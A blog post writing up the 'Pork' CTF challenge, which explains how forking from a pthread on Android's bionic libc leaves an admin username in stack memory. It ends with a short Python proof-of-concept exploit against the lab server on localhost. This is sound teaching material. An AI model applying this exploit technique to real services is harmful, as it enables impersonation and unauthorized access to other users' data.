---
layout: post
title:  "Pork ctf writeup"
date:   2025-01-17 19:29:43 +0200
categories: ctf writeup android pwn
---

Do you want to try it yourself? [Click here](https://github.com/Schwartzblat/pork_ctf).

## Introduction

Before we start digging into the challenge, you should try solving it yourself.
I recommend attemping it before reading this writeup.

## Overview

This is a simple C++ TCP socket server that runs inside of an android app. The server listens on port 8888. The goal here is to fetch the note of the admin that contains the flag from an app on the same phone


## Attack surface

The server has multiple features:

1. Login
2. Logout
3. Change password
4. Create note
5. Delete note
6. Get note
7. Move to other thread
8. Disconnect

Upon logging in, a directory corresponding to your user is created at `/data/data/com.pork/users`.
This directory contains a file named `password` which holds your plain text password.
The notes are also saved here, where their name is their id (a number smaller than 255).


## Weird stuff worth looking at

### Forking after reaching a specific number of notes:

```c
create_note(user, note.get());
if (get_notes_count(user) == HIGH_NUMBER_OF_NOTES && fork() != 0) {
    pthread_exit(nullptr);
}
```
It's a strange thing to do, could be done for load balancing.

### The state management system:

```c
char *get_stack_safe() {
    // Getting the safe address from the stack
    pthread_t self = pthread_self();
    pthread_attr_t attr;
    pthread_getattr_np(self, &attr);
    char *stack;
    size_t stack_size;
    // Getting the start of the stack page
    pthread_attr_getstack(&attr, reinterpret_cast<void**>(&stack), &stack_size);
    pthread_attr_destroy(&attr);
    return stack + STACK_OFFSET;
}
```
You can easily say - that's weird, nobody does that (and for a reason, you will see later).

#### How does this mechanism works? 

Every thread has its own stack mapping so the username and password can sit there "safely" and every thread will have his own username and password at this fixed offset in the stack.
```c
void set_current_user(const std::string &username, const std::string &password) {
    // Setting the current user on the stack in a safe way
    char *stack = get_stack_safe();
    memcpy(stack, password.c_str(), password.length());
    *reinterpret_cast<char *>(stack + password.length()) = '\0';
    memcpy(stack + strlen(stack) + 1, username.c_str(), username.length());
    if (username.empty()) {
        // No need to null terminate the username
        return;
    }
    *reinterpret_cast<char *>(stack + strlen(stack) + 1 + username.length()) = '\0';
}
```
We can see that this function sets the password and adds a nullbyte, and if the username is empty it doesn't do anything else.
This allows us to set the password and use **uninitialized data as username** if we can reach this state with an empty username.

### Memsetting the password of the admin:

```c
create_user(STRONG_USERNAME, STRONG_PASSWORD);
set_current_user(STRONG_USERNAME, STRONG_PASSWORD);
if (get_notes_count(STRONG_USERNAME) == 0) {
    create_note(STRONG_USERNAME, CTF_FLAG);
}
// Erasing the password from the stack
char *stack = get_stack_safe();
memset(stack, 0, strlen(STRONG_PASSWORD));
```
You can see that the program writes zeroes only on the password.

Without diving too deep, it's not suppose to be an issue because as I mentioned before, every thread has its own stack mapping—doesn't it?

## Primitives

### Change Password

There is only one flow that could lead to unitialized username:
```c
void change_password(int sock) {
    uint8_t size;
    auto password = recv_sized(sock, &size);
    if (password == nullptr) {
        close_socket_and_send(sock, "You can't set an empty password");
    }
    set_current_user(get_current_user(), password.get());
    if (!user_exists(get_current_user())) {
        close_socket_and_send(sock, "User does not exist");
    }
    std::ofstream password_file(USERS_PATH / get_current_user() / PASSWORD_FILE, std::ios::out);
    password_file << password.get();
}
```
We can set the password to whatever we want, and read uninitialized data into the username.

This primitive would be sufficient if not for the following check:
```c
void fail_if_admin(const std::string &text) {
    if (text.find(STRONG_USERNAME) != std::string::npos) {
        pthread_exit(nullptr);
    }
}
```
This function is called on every data received from our app.

Without this check, we could do the following steps:
1. Login with `"username"` and `"password"`.
2. Change the password to `"pass"` + `"S"` + `"ADMIN"`
3. Change the password to `"pass"`.

The memory stack will look like this:
1. `password\0username`
2. `passSADMIN\0username`
3. `pass\0ADMIN\0username`

It's a nice "What if" but unfortunately, it doesn't work so we need another primitive.

### Fork After Pthread

You could guess it from the name of the ctf (Pork- pthread + fork), the actual vulnerabilitty is here.

What's the problem with calling `fork` after `pthread_create`? As you'll see, there are a lot of problems with this approach and you are not supposed to do this since it can cause a lot of issues.

For example, if one thread acquires a lock and another thread calls `fork`, a new process will be created with this lock that would be forever locked because no thread is going to unlock it.

So, what's happening here? Let's take look into the implementation of `pthread_getattr_np` from bionic libc code:

```c
int pthread_getattr_np(pthread_t t, pthread_attr_t* attr) {
  pthread_internal_t* thread = reinterpret_cast<pthread_internal_t*>(t);
  *attr = thread->attr;
  // We prefer reading join_state here to setting thread->attr.flags in pthread_detach.
  // Because data race exists in the latter case.
  if (atomic_load(&thread->join_state) == THREAD_DETACHED) {
    attr->flags |= PTHREAD_ATTR_FLAG_DETACHED;
  }
  // The main thread's stack information is not stored in thread->attr, and we need to
  // collect that at runtime.
  if (thread->tid == getpid()) {
    return __pthread_attr_getstack_main_thread(&attr->stack_base, &attr->stack_size);
  }
  return 0;
}

```
As we can see, there is a special case when we call it from the main thread.

The function `__pthread_attr_getstack_main_thread` calls `__find_main_stack_limits` to determinate the stack address so let's take a look:
```c
void __find_main_stack_limits(uintptr_t* low, uintptr_t* high) {
  // Ask the kernel where our main thread's stack started.
  uintptr_t startstack = __get_main_stack_startstack();

  // Hunt for the region that contains that address.
  FILE* fp = fopen("/proc/self/maps", "re");
  if (fp == nullptr) {
    async_safe_fatal("couldn't open /proc/self/maps: %m");
  }
  char line[BUFSIZ];
  while (fgets(line, sizeof(line), fp) != nullptr) {
    uintptr_t lo, hi;
    if (sscanf(line, "%" SCNxPTR "-%" SCNxPTR, &lo, &hi) == 2) {
      if (lo <= startstack && startstack <= hi) {
        *low = lo;
        *high = hi;
        fclose(fp);
        return;
      }
    }
  }
  async_safe_fatal("stack not found in /proc/self/maps");
}
```
As we can see, `pthread_getattr_np` determinates the stack address of the thread by checking `/proc/self/maps` if it's the main thread. Otherwise, it uses the attributes from the thread struct.

Why does forking from a thread matters? When you fork from secondary thread, your `$sp` register will point to the actualy stack, but because you are the main thread now, `pthread_getattr_np` will return the stack address of the main thread in the parent process instead.

```c
void* thread_entry(void* arg) {
    // Secondary thread $sp: 0xABCDABCD
    // Secondary thread pthread stack: 0xABCDABCD
    if (fork() != 0) {
        return nullptr;
    }
    // Main thread of the new process $sp: 0xABCDABCD
    // Main thread of the new process pthread stack: 0xDEADBEEF
    return nullptr;
}


// parent main thread
// parent $sp: 0xDEADBEEF
// parent pthread stack: 0xDEADBEEF

pthread_t thread;
pthread_create(&thread, thread_entry)
```
Let's get back to the challenge, if we reach a `HIGH_NUMBER_OF_NOTES`, the program calls fork and continue running from the child.

The child process's stack, as retrieved by `pthread_getattr_np` is is the same as the main thread’s stack in the original process, meaning the `ADMIN` string remains in the stack.

## Exploiting
After the fork, the stack will look like this:
```py
'\0' * (PASSWORD_LENGTH + 1) + 'ADMIN'
```
We can use the primitive from `change_password` (which lets us make the username use uninitialized memory) and guess the length of the password so that the username will be `ADMIN`.

Now, all that's left is to read the first note and retrieve the flag :)

## POC
```py
password_length = 1
note = ''
while note == '':
    sock = remote('127.0.0.1', PORT)
    sock.settimeout(0.4)
    login(sock, "user", "pass")

    for i in range(HIGH_NUMBER_OF_NOTES):
        delete_note(sock, i)

    for i in range(HIGH_NUMBER_OF_NOTES):
        create_note(sock, "A")

    change_password(sock, 'a' * password_length)
    note = get_note(sock, 0)
    password_length += 1
    sock.close()
print(note)
```